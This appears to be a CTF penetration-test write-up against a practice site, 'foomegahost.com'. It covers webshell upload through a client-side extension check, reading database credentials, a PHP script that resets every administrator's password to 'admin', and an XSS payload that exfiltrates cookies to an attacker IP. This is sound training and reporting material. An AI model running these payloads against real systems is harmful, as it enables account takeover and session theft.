---
description: CTF Blackbox testing of "foomegahost.com"
---

# Vulnerability Report - II

### Access to Support

#### Login as `test` User

We were able to login using the username (`test`) and password (`password1234`) obtained through the bruteforce attack.

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

### LFI Vulnerability

Local File Inclusion (LFI) vulnerability occurs when an application allows an attacker to include a file on the server that is not intended to be included. This can allow an attacker to execute arbitrary code, read sensitive files or even gain complete control over the server.

To check for LFI vulnerability, one approach is to try to upload a PHP file and change the file extension to an allowed file type like `.png`, and then intercept the request using Burp Suite. Then, we can modify the file extension back to PHP and forward the request. If the server processes the file as PHP instead of an image, it indicates that the application is vulnerable to LFI.

It's important to note that exploiting an LFI vulnerability can have serious consequences, including data theft, server compromise, and unauthorized access to sensitive information. Therefore, it's crucial to identify and address these vulnerabilities promptly to minimize the risk of exploitation.

<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

In the JavaScript code of the page source, we can see that the extensions are checked at the client level instead of the server level. This makes the website vulnerable to LFI (Local File Inclusion) attacks.

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

#### Building PHP webshell

We obtained a `PHP` webshell from [revshells.com](http://revshells.com/) for testing purposes. We intercepted the request using the Burp Suite and changed the extension back to `.php`.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/822910f4-d7fc-47ce-9a2a-c74254b8285a/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f1c6a9bb-83f5-4b5e-80d5-f5c5c84a4589/Untitled.png)

#### Launching the PHP Shell

To run our PHP webshell, we first need to go to the tickets area and then click on the attachments. This will allow us to obtain a reverse shell back on our Kali machine.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/dfc324fb-e2fe-4f75-8066-ab1d6f37d15b/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6bcc3bbc-6c6b-472f-a3fc-95e68aa34514/Untitled.png)

After gaining access to the Kali machine's shell, we can begin enumerating and searching for interesting files, such as `config.php`.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3be2da10-bd41-4554-ac03-cf89c0ef8522/Untitled.png)

#### Reading `config.php`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7db5ae10-e62a-4130-969c-a835d33da9a6/Untitled.png)

### Access to Intranet Area

#### [fmh-intranetarea.foomegahost.com](http://fmh-intranetarea.foomegahost.com)

According to the information found in the `config.php` file, the subdomain `fmh-interanetarea.` is mentioned. Upon visiting the `fmh-interanetarea.` subdomain, we were able to access its webpage. The screenshots are attached below. This subdomain seems to be for intranet login.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3e589a89-ada3-4df0-b075-5c9f57d73722/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7a86beb3-4ec0-460e-8d97-91b605d0e48e/Untitled.png)

### Admin Access

After identifying the LFI vulnerability and the `config.php` file that contains the details to connect to `MySQL`, we will attempt to change the password of users with `Administrator` rights, identified by the ID `1`. We will write a `.php` script that changes the password to `admin`, and upload it to change the passwords.

```clojure
<?php

// Define database connection parameters
$config['DB']['USERS']['dbname'] = "foomegahost";
$config['DB']['USERS']['dbhostname'] = "127.0.0.1:6603";
$config['DB']['USERS']['user'] = "res_foomegahost";
$config['DB']['USERS']['password'] = "C8COcl84QSbM9hL7EC7F";

// Create database connection
$conn = mysqli_connect($config['DB']['USERS']['dbhostname'], $config['DB']['USERS']['user'], $config['DB']['USERS']['password'], $config['DB']['USERS']['dbname']);

// Check if connection was successful
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

// Update password for all rows where role=1
$sql = "UPDATE user SET password='21232f297a57a5a743894a0e4a801fc3' WHERE role=1";
$result = mysqli_query($conn, $sql);

// Check if update was successful
if ($result) {
    // Print the updated user table
    $sql = "SELECT * FROM user";
    $result = mysqli_query($conn, $sql);

    if (mysqli_num_rows($result) > 0) {
        echo "<table><tr><th>ID</th><th>Username</th><th>Password</th><th>Role</th></tr>";
        while ($row = mysqli_fetch_assoc($result)) {
            echo "<tr><td>" . $row["id"] . "</td><td>" . $row["username"] . "</td><td>" . $row["password"] . "</td><td>" . $row["role"] . "</td></tr>";
        }
        echo "</table>";
    } else {
        echo "0 results";
    }
} else {
    echo "Error updating password: " . mysqli_error($conn);
}

// Close database connection
mysqli_close($conn);

?>
```

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/afd57e63-fbc4-414a-8732-6ad6ac32441c/Untitled.png)

#### Admin Page

Now that we have changed the password for the `admin` user, we can log in to the admin area using the `admin` username and `admin` password.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b1e8aa4f-c629-4914-a32e-ac6656734128/Untitled.png)

### Miscellaneous

#### Information Disclosure

Listing the names of employees and clients on a website may pose a security risk as it can potentially allow attackers to gather sensitive information about them. This information can be misused for targeted attacks such as spear phishing, social engineering, or identity theft. It is important for organizations to carefully consider the information they make public on their website and implement appropriate measures to protect their employees and clients.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7d5b7515-2231-499f-b537-a8582a115f05/Untitled.png)

#### Admin Username Disclosure

If an adversary attempts to log in to the `me.foomegahost.com` members site using a non-administrator username, no particular error message is shown, but when the username `admin` is used, the site responds with a specific error message indicating the existence of the admin account. This can be exploited to carryout bruteforce attacks against the `admin` username.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6e9630b7-e272-4e88-a4ac-c84a04706f70/Untitled.png)

#### XSS Vulnerability

Cross-site scripting (XSS) is a type of security vulnerability commonly found in web applications. It occurs when an attacker is able to inject malicious code, usually in the form of a script, into a vulnerable website that is then executed in a victim's web browser. This can lead to the theft of sensitive information, such as user credentials or payment information, or the hijacking of the user's session. The screenshots are attached below.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6bebaa2f-68d4-4291-8e4d-1e5084338382/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/4c224f43-eb5e-4ec3-bb82-f2c5b4d3c3c8/Untitled.png)

#### Exfiltrating Cookies

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/795a3360-cba3-48f3-a579-f0b5675623b3/Untitled.png)

Additionally, the attacker can use the stolen cookies to impersonate the user and perform actions on their behalf. The following is an example proof-of-concept (PoC) showing how cookies can be exfiltrated to a Kali server using a simple XSS payload.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/613f77ba-d10e-477b-ad93-f0174da6b08e/Untitled.png)

```jsx
<script>var i=new Image();i.src="<http://172.16.5.70:8001/loot.php?q=>"+document.cookie;</script>
```

This payload creates a new image object and sets its source to a remote server, along with the user's cookie data. The remote server can now log the cookie data and use it for malicious purposes. It is important to note that XSS vulnerabilities can have serious consequences and should be addressed promptly to prevent attacks.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/95fd9474-600f-4abe-aa9a-b4859eb24e92/Untitled.png)

#### SQL Injection attack in Support Form

During our security testing, we discovered that the support form on the website is vulnerable to SQL injection. This means that an attacker can exploit this vulnerability to gain unauthorized access to the database or execute malicious code. We conducted a series of tests on various parameters, and our findings revealed that the `category` parameter is particularly vulnerable.

To demonstrate the severity of this vulnerability, we have included screenshots below that show the successful exploitation of the SQL injection vulnerability through the `category` parameter. It is important to address this vulnerability as soon as possible to prevent any potential damage that could be caused by a malicious attacker.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/223c21fd-d0b4-4a0d-ae89-dad2c583d468/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/10be1dec-8262-42d6-942d-00b3455c93c7/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e853fe6f-bbf9-480d-9849-198075748826/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/67a18c8a-d50f-4fde-91cd-2228b63a0c32/Untitled.png)

##
